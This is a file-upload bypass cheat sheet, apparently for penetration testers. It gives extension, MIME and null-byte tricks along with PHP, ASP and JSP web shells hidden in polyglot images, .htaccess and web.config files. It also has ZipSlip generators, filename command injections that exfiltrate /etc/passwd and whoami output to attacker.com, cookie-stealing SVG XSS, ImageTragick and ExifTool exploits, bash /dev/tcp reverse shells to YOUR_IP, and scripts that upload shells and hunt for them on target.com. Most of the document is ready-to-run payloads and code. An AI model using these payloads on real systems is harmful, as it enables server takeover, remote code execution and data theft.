# FileUploadChecklist

# File Upload Bypass - Complete Payloads & Techniques

## Table of Contents
1. [Extension Bypass](#1-extension-bypass)
2. [Magic Bytes / MIME Type Bypass](#2-magic-bytes--mime-type-bypass)
3. [Polyglot Files](#3-polyglot-files)
4. [Null Byte Injection](#4-null-byte-injection)
5. [Case Manipulation](#5-case-manipulation)
6. [Special Characters (Windows)](#6-special-characters-windows)
7. [Content-Type Manipulation](#7-content-type-manipulation)
8. [Path Traversal](#8-path-traversal)
9. [.htaccess Upload](#9-htaccess-upload)
10. [SVG XSS](#10-svg-xss)
11. [web.config Upload (IIS)](#11-webconfig-upload-iis)
12. [ZipSlip](#12-zipslip)
13. [RCE via Filename](#13-rce-via-filename)
14. [ExifTool Exploit](#14-exiftool-exploit)
15. [ImageMagick (ImageTragick)](#15-imagemagick-imagetragick)
16. [PHP GD Library Bypass](#16-php-gd-library-bypass)
17. [FFMPEG Exploit](#17-ffmpeg-exploit)
18. [ADS (Alternate Data Stream)](#18-ads-alternate-data-stream)

---

## 1. Extension Bypass

### A. Alternative PHP Extensions
```
shell.php
shell.php3
shell.php4
shell.php5
shell.php7
shell.pht
shell.phtml
shell.phps
shell.phar
shell.pgif
shell.inc
shell.shtml
```

### B. Double Extensions
```
shell.php.jpg
shell.php.png
shell.php.gif
shell.jpg.php
shell.png.php
shell.asp.jpg
shell.aspx.png
```

### C. Reverse Double Extension
```
shell.jpg.php
shell.png.php5
shell.gif.phtml
```

### D. Special Extensions for Different Servers
**ASP / ASP.NET:**
```
shell.asp
shell.aspx
shell.cer
shell.asa
shell.asax
shell.config
```

**JSP:**
```
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf
```

**Perl:**
```
shell.pl
shell.pm
shell.cgi
shell.lib
```

---

## 2. Magic Bytes / MIME Type Bypass

### A. Common Magic Bytes

**GIF89a (Most Common for PHP)**
```php
GIF89a
<?php system($_GET['cmd']); ?>
```

**GIF87a**
```php
GIF87a
<?php system($_GET['cmd']); ?>
```

**PNG**
```php
\x89PNG\r\n\x1a\n
<?php system($_GET['cmd']); ?>
```

**JPEG/JPG**
```php
\xFF\xD8\xFF\xE0\x00\x10JFIF
<?php system($_GET['cmd']); ?>
```

Or shorter:
```php
\xFF\xD8\xFF\xDB
<?php system($_GET['cmd']); ?>
```

**PDF**
```php
%PDF-1.5
<?php system($_GET['cmd']); ?>
```

**BMP**
```php
BM
<?php system($_GET['cmd']); ?>
```

**TAR**
```
\x75\x73\x74\x61\x72\x00\x30\x30
```

### B. Magic Bytes Reference Table

| File Type | Magic Bytes (Hex)       | Magic Bytes (ASCII) |
| --------- | ----------------------- | ------------------- |
| GIF       | 47 49 46 38 39 61       | GIF89a              |
| GIF       | 47 49 46 38 37 61       | GIF87a              |
| PNG       | 89 50 4E 47 0D 0A 1A 0A | \x89PNG\r\n\x1a\n   |
| JPG       | FF D8 FF E0             | ÿØÿà                |
| JPG       | FF D8 FF DB             | ÿØÿÛ                |
| PDF       | 25 50 44 46 2D          | %PDF-               |
| ZIP       | 50 4B 03 04             | PK..                |
| BMP       | 42 4D                   | BM                  |
| XML       | 3C 3F 78 6D 6C          | <?xml               |


---


## 3. Polyglot Files

### A. GIF + PHP Polyglots

**Basic Shell**

```php
GIF89a<?php system($_GET['cmd']); ?>
```

**Minimal Shell**

```php
GIF89a<?=`$_GET[0]`?>

```
Usage: `?0=whoami`

**Shell with passthru**
```php
GIF89a<?php passthru($_GET['x']); ?>
```

**Shell with exec**
```php
GIF89a<?php echo exec($_GET['c']); ?>
```

**Shell with shell_exec**
```php
GIF89a<?php echo shell_exec($_GET['cmd']); ?>
```

### B. PNG + PHP Polyglot

**Method 1: Manual**
```php
\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82
<?php system($_GET['cmd']); ?>
```

**Method 2: Using exiftool**
```bash
# Create valid PNG first
convert -size 1x1 xc:white test.png

# Inject PHP code into comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' test.png -o shell.png

# Or into Copyright field
exiftool -Copyright='<?php system($_GET["cmd"]); ?>' test.png -o shell.png
```

### C. JPEG + PHP Polyglot

**Method 1: Using exiftool**
```bash
# Create/use valid JPEG
# Inject PHP into JPEG comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg

# Or DocumentName
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg
```

**Method 2: Manual JPEG + PHP**
```php
\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xFE\x00\x3B<?php system($_GET['cmd']); ?>\xFF\xD9
```

### D. Advanced Polyglot with Multiple Formats

**GIF + ZIP (Polyglot)**
```bash
# Create GIF with PHP
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php

# Add to ZIP
zip shell.zip shell.php

# Prepend GIF header to ZIP
cat shell.zip > final.gif
```

---

## 4. Null Byte Injection

### A. Basic Null Byte

**URL Encoded**
```
shell.php%00.jpg
shell.php%00.png
shell.php%00.gif
shell.asp%00.jpg
```

**Hex Encoded**
```
shell.php\x00.jpg
shell.php\x00.png
```

### B. Multiple Null Bytes
```
shell.php%00%00.jpg
shell.php\x00\x00.png
```

### C. Null Byte with Path Traversal
```
../../shell.php%00.jpg
../../../shell.php%00.png
```

### D. Testing Null Byte in Burp Suite
```http
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

---

## 5. Case Manipulation

### A. Mixed Case Extensions
```
shell.PhP
shell.pHp
shell.phP
shell.PHP
shell.Php
shell.pHP
shell.PHp
shell.PhP5
shell.pHtml
shell.pHar
```

### B. Case with Double Extension
```
shell.php.Jpg
shell.PHP.png
shell.Php.GIF
```

### C. Case with Alternative Extensions
```
shell.Php3
shell.Php4
shell.Php5
shell.Phtml
shell.Phar
```

---

## 6. Special Characters (Windows)

### A. Trailing Dot (Windows Only)
```
shell.php.
shell.php..
shell.php...
shell.php. . .
shell.aspx.
shell.asp.
```

**Explanation:** Windows removes trailing dots when saving files
- Upload: `shell.php.`
- Saved as: `shell.php`

### B. Trailing Space
```
shell.php%20
shell.php%20%20
shell.asp%20
```

### C. Windows Reserved Characters
```
shell.php::$DATA
shell.php::$INDEX_ALLOCATION
```

### D. Combined Special Characters
```
shell.php. . .
shell.php%20%20.
shell.php....%20
```

---

## 7. Content-Type Manipulation

### A. Change Content-Type to Image

**In Burp Suite:**
```http
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/gif

GIF89a
<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### B. Common MIME Types to Try
```
image/gif
image/png
image/jpeg
image/jpg
image/bmp
image/x-png
text/plain
text/html
application/octet-stream
```

### C. Manipulate Both Extension and MIME
```http
Content-Disposition: form-data; name="file"; filename="shell.php5"
Content-Type: image/gif

GIF89a<?php system($_GET['cmd']); ?>
```

---

## 8. Path Traversal

### A. Basic Path Traversal
```
../shell.php
../../shell.php
../../../shell.php
../../../../shell.php
```

### B. URL Encoded Path Traversal
```
..%2Fshell.php
..%2F..%2Fshell.php
..%2F..%2F..%2Fshell.php
```

### C. Double URL Encoded
```
..%252Fshell.php
..%252F..%252Fshell.php
```

### D. Mixed Encoding
```
..%2F..%2Fshell.php
....//....//shell.php
..\/..\/shell.php
```

### E. Windows Path Traversal
```
..\shell.php
..\..\shell.php
..\..\..\shell.php
```

### F. Absolute Path
```
/var/www/html/shell.php
C:\inetpub\wwwroot\shell.php
```

---

## 9. .htaccess Upload

### A. Basic .htaccess for PHP Execution

**.htaccess content:**
```apache
AddType application/x-httpd-php .evil
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
```

**Workflow:**
1. Upload `.htaccess` with above content
2. Upload `shell.evil` or `shell.jpg` with PHP code
3. Access `shell.evil` or `shell.jpg` - will execute as PHP

### B. Advanced .htaccess Configurations

**Allow PHP in specific extension:**
```apache
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**Remove extension requirement:**
```apache
AddType application/x-httpd-php .
```

**Multiple handlers:**
```apache
AddType application/x-httpd-php .rce
AddHandler application/x-httpd-php .shell
AddHandler cgi-script .abc
```

### C. .htaccess with PHP Code (One File Attack)

**.htaccess file:**
```apache
AddType application/x-httpd-php .htaccess
# <?php system($_GET['cmd']); ?>
```

Then access: `.htaccess?cmd=whoami`

### D. Test Requirements

Check if server allows:
```bash
# Test if .htaccess is processed
curl -I http://target.com/.htaccess

# Check Apache config
/etc/apache2/apache2.conf: AllowOverride Options
/etc/apache2/apache2.conf: AllowOverride FileInfo
```

---

## 10. SVG XSS

### A. Basic SVG with Alert

**malicious.svg:**
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="300" height="100" style="fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)" />
    <script type="text/javascript">
        alert("XSS!");
    </script>
</svg>
```

### B. SVG with document.cookie

```xml
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
</svg>
```

### C. SVG with External JavaScript

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <script xlink:href="https://attacker.com/evil.js"></script>
</svg>
```

### D. SVG with onload Event

```xml
<svg onload="alert(document.domain)" xmlns="http://www.w3.org/2000/svg"></svg>
```

### E. Minimal SVG XSS

```xml
<svg onload=alert(1)>
```

### F. SVG with Embedded Image + XSS

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <script type="text/javascript">
        document.location='https://attacker.com/steal.php?cookie='+document.cookie;
    </script>
</svg>
```

---

## 11. web.config Upload (IIS)

### A. Basic web.config for RCE

**web.config:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
        </handlers>
        <security>
            <requestFiltering>
                <fileExtensions>
                    <remove fileExtension=".config" />
                </fileExtensions>
                <hiddenSegments>
                    <remove segment="web.config" />
                </hiddenSegments>
            </requestFiltering>
        </security>
    </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
Set objShell = CreateObject("WScript.Shell")
Set cmd = objShell.Exec("cmd.exe /c whoami")
output = cmd.StdOut.Readall()
Response.write(output)
Response.write("<!-"&"-")
%>
-->
```

### B. web.config for Command Execution

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
Response.write("-"&"->")
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%
szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)
%>
</PRE>
<!-"&"-
-->
```

### C. web.config with Reverse Shell

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
Response.write("-"&"->")
Set objShell = CreateObject("WScript.Shell")
objShell.Exec("c:\windows\system32\cmd.exe /c powershell -c IEX(New-Object Net.WebClient).downloadString('http://YOUR_IP/shell.ps1')")
Response.write("<!-"&"-")
%>
-->
```

---

## 12. ZipSlip

### A. Generate Malicious Zip (Python 2)

```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../rce.php', '<?php system($_GET["cmd"]); ?>')
    z.close()
    zip_file = open('rce.zip','wb')
    zip_file.write(f.getvalue())
    zip_file.close()

_build_zip()
```

### B. Generate Malicious Zip (Python 3)

```python
#!/usr/bin/env python3
import zipfile
from io import BytesIO

def build_zipslip(filename, payload, traversal_path):
    """
    filename: output zip filename
    payload: content to write
    traversal_path: path with traversal (e.g., '../../shell.php')
    """
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr(traversal_path, payload)
    z.close()
    
    with open(filename, 'wb') as zip_file:
        zip_file.write(f.getvalue())
    
    print(f"[+] Created {filename} with payload at {traversal_path}")

# Create malicious zip
build_zipslip('rce.zip', '<?php system($_GET["cmd"]); ?>', '../../shell.php')
build_zipslip('rce2.zip', '<?php system($_GET["cmd"]); ?>', '../../../var/www/html/shell.php')
build_zipslip('rce3.zip', '<?php system($_GET["cmd"]); ?>', '../../../../tmp/shell.php')
```

### C. Multiple File ZipSlip

```python
#!/usr/bin/env python3
import zipfile
from io import BytesIO

f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)

# Add multiple shells with different paths
z.writestr('../../shell1.php', '<?php system($_GET["cmd"]); ?>')
z.writestr('../../../shell2.php', '<?php system($_GET["cmd"]); ?>')
z.writestr('../../../../var/www/html/shell3.php', '<?php system($_GET["cmd"]); ?>')
z.writestr('../../../tmp/shell4.php', '<?php system($_GET["cmd"]); ?>')

z.close()

with open('multi_rce.zip', 'wb') as zip_file:
    zip_file.write(f.getvalue())

print("[+] Created multi_rce.zip with multiple shells")
```

### D. ZipSlip with Different Payloads

```python
#!/usr/bin/env python3
import zipfile
from io import BytesIO

payloads = {
    '../../shell.php': '<?php system($_GET["cmd"]); ?>',
    '../../shell.aspx': '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd());%>',
    '../../shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
}

f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)

for path, payload in payloads.items():
    z.writestr(path, payload)

z.close()

with open('multi_lang_rce.zip', 'wb') as zip_file:
    zip_file.write(f.getvalue())

print("[+] Created multi_lang_rce.zip")
```

---

## 13. RCE via Filename

### A. Command Injection in Filename

**Test Filenames:**
```
test$(whoami).jpg
test`whoami`.jpg
test;whoami;.jpg
test|whoami|.jpg
test&&whoami&&.jpg
test||whoami||.jpg
$(curl http://attacker.com/$(whoami)).jpg
`curl http://attacker.com/\`whoami\``.jpg
```

### B. Sleep Test (Detection)
```
test;sleep 30;.jpg
test$(sleep 30).jpg
test`sleep 30`.jpg
test|sleep 30|.jpg
```

If response takes 30+ seconds, command execution confirmed!

### C. Out-of-Band Exfiltration
```
$(curl http://attacker.com/?data=$(whoami)).jpg
$(wget http://attacker.com/?data=$(id)).jpg
`curl http://attacker.com/$(cat /etc/passwd | base64)`.jpg
```

### D. Blind Command Injection
```
;nslookup $(whoami).attacker.com;.jpg
;ping -c 5 attacker.com;.jpg
$(curl http://attacker.com/log?user=$(whoami)).jpg
```

---

## 14. ExifTool Exploit

### A. CVE-2021-22204 (ExifTool RCE)

**Vulnerability:** ExifTool versions 7.44 through 12.23

**Create Exploit:**

```bash
# Step 1: Create DjVu file
(metadata "<?php system('id'); __halt_compiler();") > exploit.djvu

# Step 2: Create config file
echo 'CAMERA = "<?php system($_GET[\"cmd\"]); __halt_compiler();"' > config

# Step 3: Generate exploit
exiftool -config config '-Camera<${system("id")}' exploit.djvu
```

**Or use automated tool:**
```bash
# Clone exploit
git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
cd CVE-2021-22204-exiftool

# Generate payload
python3 exploit.py -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" -o exploit.djvu

# Upload exploit.djvu to target
```

### B. Testing for ExifTool Vulnerability

```bash
# Create test file
echo 'GIF89a<?php system("id"); ?>' > test.gif

# Check if exiftool processes it
exiftool test.gif

# Upload and check if executed
```

---

## 15. ImageMagick (ImageTragick)

### A. CVE-2016-3714 (ImageTragick)

**Exploit File (exploit.mvg):**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|whoami")'
pop graphic-context
```

**Or for RCE:**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")'
pop graphic-context
```

### B. Alternative Payloads

**LFR (Local File Read):**
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```

**SSRF:**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://internal-server/)'
pop graphic-context
```

### C. Testing for ImageMagick

```bash
# Create test file
cat > exploit.mvg << EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|sleep 30")'
pop graphic-context
EOF

# Rename to accepted extension
mv exploit.mvg exploit.jpg
# Or
mv exploit.mvg exploit.png

# Upload and check if response delays 30 seconds
```

---

## 16. PHP GD Library Bypass

### A. Understanding PHP GD

When PHP GD processes an image:
```php
$image = imagecreatefromjpeg($_FILES['file']['tmp_name']);
imagejpeg($image, 'output.jpg');
```

The image is recompressed and most data changes. We need to find **unchanged bytes**.

### B. Create Payload that Survives GD

**Tool: php_gd_bypass**
```bash
# Clone tool
git clone https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg.git
cd Defeating-PHP-GD-imagecreatefromjpeg

# Create base image
convert -size 32x32 xc:white base.jpg

# Run exploit
php php_gd_bypass.php base.jpg

# This creates payload.jpg with PHP code that survives GD processing
```

### C. Manual Method

```python
#!/usr/bin/env python3
from PIL import Image
import io

# Create minimal valid JPEG
img = Image.new('RGB', (32, 32), color='red')
img_bytes = io.BytesIO()
img.save(img_bytes, format='JPEG')
img_data = img_bytes.getvalue()

# Find unchanged region (trial and error)
# Insert PHP payload in JPEG comment section
payload = b'<?php system($_GET["cmd"]); ?>'

# Inject payload
modified = img_data[:160] + payload + img_data[160+len(payload):]

with open('gd_bypass.jpg', 'wb') as f:
    f.write(modified)
```

### D. Detection

Check if GD is used:
```bash
# Upload image, download it back
# Check EXIF data
exiftool downloaded_image.jpg | grep -i "creator"

# If you see: CREATOR: gd-jpeg v1.0 (using IJG JPEG v62)
# Then GD is being used
```

---

## 17. FFMPEG Exploit

### A. SSRF via FFMPEG

**Exploit File (exploit.avi):**
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://internal-server/
#EXT-X-ENDLIST
```

### B. LFR (Local File Read) via FFMPEG

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
concat:http://example.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST
```

### C. Generate Exploit

```bash
# Create m3u8 playlist
cat > exploit.avi << EOF
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
file:///etc/passwd
#EXT-X-ENDLIST
EOF

# Upload exploit.avi
# FFMPEG will try to read /etc/passwd
```

---

## 18. ADS (Alternate Data Stream)

### A. Basic ADS Bypass (Windows Only)

```
shell.asp:.jpg
shell.aspx:.png
shell.php:.gif
```

**Explanation:**
- Windows creates: `shell.asp` (actual file)
- With alternate stream: `.jpg` (metadata)

### B. ::$DATA Pattern

```
shell.asp::$DATA.jpg
shell.aspx::$DATA.png
shell.php::$DATA.gif
```

### C. Combined with Dot

```
shell.asp::$DATA.
shell.aspx::$DATA..
shell.php::$DATA...
```

---

## 19. Combined Attack Strategies

### Strategy 1: Comprehensive Extension Test
```bash
#!/bin/bash
TARGET="http://target.com/upload.php"
PAYLOAD='GIF89a<?php system($_GET["cmd"]); ?>'

extensions=(php php3 php4 php5 php7 pht phtml phps phar pgif shtml inc asp aspx cer asa jsp jspx)

for ext in "${extensions[@]}"; do
    echo "[*] Testing .$ext"
    echo "$PAYLOAD" > shell.$ext
    curl -F "file=@shell.$ext" $TARGET
done
```

### Strategy 2: Multi-Vector Attack
```bash
#!/bin/bash
# Test multiple bypass techniques

# 1. Basic upload
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "file=@shell.php" $TARGET

# 2. Alternative extension
mv shell.php shell.php5
curl -F "file=@shell.php5" $TARGET

# 3. Double extension
mv shell.php5 shell.php.jpg
curl -F "file=@shell.php.jpg" $TARGET

# 4. Null byte (if vulnerable)
# Use Burp Suite to inject: shell.php%00.jpg

# 5. Case manipulation
mv shell.php.jpg shell.PhP
curl -F "file=@shell.PhP" $TARGET
```

### Strategy 3: Polyglot + Multiple Extensions
```bash
# Create polyglot
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > base.php

# Try with different extensions
for ext in php php5 phtml gif jpg png; do
    cp base.php shell.$ext
    curl -F "file=@shell.$ext" $TARGET
done
```

---

## 20. Automated Testing Tools

### A. Upload Fuzzer Script
```python
#!/usr/bin/env python3
import requests
from itertools import product

url = "http://target.com/upload.php"
payload = b'GIF89a<?php system($_GET["cmd"]); ?>'

extensions = ['php', 'php3', 'php5', 'phtml', 'phar']
cases = ['lower', 'upper', 'mixed']
prefixes = ['', 'GIF89a', '\x89PNG\r\n\x1a\n']

for ext, case_type, prefix in product(extensions, cases, prefixes):
    if case_type == 'upper':
        ext = ext.upper()
    elif case_type == 'mixed':
        ext = ''.join([c.upper() if i % 2 else c for i, c in enumerate(ext)])
    
    filename = f'shell.{ext}'
    content = prefix.encode() + payload if isinstance(prefix, str) else prefix + payload
    
    files = {'file': (filename, content, 'image/gif')}
    r = requests.post(url, files=files)
    
    print(f"[*] {filename}: {r.status_code}")
    
    if 'success' in r.text.lower() or 'uploaded' in r.text.lower():
        print(f"[+] POTENTIAL SUCCESS: {filename}")
```

### B. Directory Bruteforce After Upload
```bash
#!/bin/bash
# After successful upload, find the file

BASE_URL="http://target.com"
FILENAME="shell"
EXTENSIONS="php php3 php5 phtml phar gif jpg png"

DIRS="/uploads /upload /files /images /media /assets /tmp /var/www/html/uploads"

for dir in $DIRS; do
    for ext in $EXTENSIONS; do
        url="$BASE_URL$dir/$FILENAME.$ext"
        echo "[*] Trying: $url"
        
        response=$(curl -s "$url?cmd=id")
        if [[ $response == *"uid="* ]]; then
            echo "[+] SHELL FOUND: $url"
            exit 0
        fi
    done
done
```

---

## 21. Detection & Testing Workflow

### Step-by-Step Testing Process

1. **Reconnaissance**
```bash
# Identify upload functionality
# Check file type restrictions
# Observe upload location in responses
# Check for client-side validation
```

2. **Basic Tests**
```bash
# Upload innocent file (test.txt)
# Check if uploaded successfully
# Find upload directory
# Check if file is accessible
```

3. **Extension Bypass**
```bash
# Try alternative extensions
# Try double extensions
# Try case manipulation
# Try null bytes
```

4. **Content Bypass**
```bash
# Add magic bytes (GIF89a)
# Create polyglot files
# Manipulate Content-Type
```

5. **Advanced Tests**
```bash
# Test .htaccess upload
# Test path traversal
# Test ZipSlip
# Test RCE via filename
```

6. **Verification**
```bash
# Access uploaded file
# Execute command
# Confirm RCE/XSS/LFI
```

---

## 22. Quick Reference Commands

### Create Polyglot Files
```bash
# GIF + PHP
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php

# PNG + PHP (using exiftool)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png -o shell.png

# JPEG + PHP (using exiftool)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg
```

### Upload with Curl
```bash
# Basic upload
curl -F "file=@shell.php" http://target.com/upload.php

# With custom Content-Type
curl -F "file=@shell.php;type=image/gif" http://target.com/upload.php

# With additional parameters
curl -F "file=@shell.php" -F "submit=Upload" http://target.com/upload.php
```

### Test Uploaded Shell
```bash
# Execute command
curl "http://target.com/uploads/shell.php?cmd=whoami"
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=ls -la"

# Read files
curl "http://target.com/uploads/shell.php?cmd=cat /etc/passwd"

# Get reverse shell
curl "http://target.com/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
```

---

## 23. Tips

1. **Always start with GIF89a polyglot** - mostly successful
2. **Try this extension:**
   - `.php` with GIF89a header
   - `.php5`
   - `.phtml`
   - `.phar`
   - `.php` with null byte (`.php%00.jpg`)

1. **Always look for error messages** - often giving the hint about the filter that we need

2. **Use Burp Suite** to manipulate Content-Type and null byte injection

3. **Check source code** to locate the upload directory

4. **If WAF Detected:**
   - Use case manipulation
   - Use special characters
   - Use  double extensions

1. **Minimal shells to bypass size limits:**
   ```php
   GIF89a<?=`$_GET[0]`?>
   ```

2. **Alternative command execution functions:**
   - `system()`
   - `shell_exec()`
   - `exec()`
   - `passthru()`
   - `popen()`
   - backticks

---

## References & Resources

- https://onsecurity.io/article/file-upload-checklist
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- https://book.hacktricks.xyz/pentesting-web/file-upload
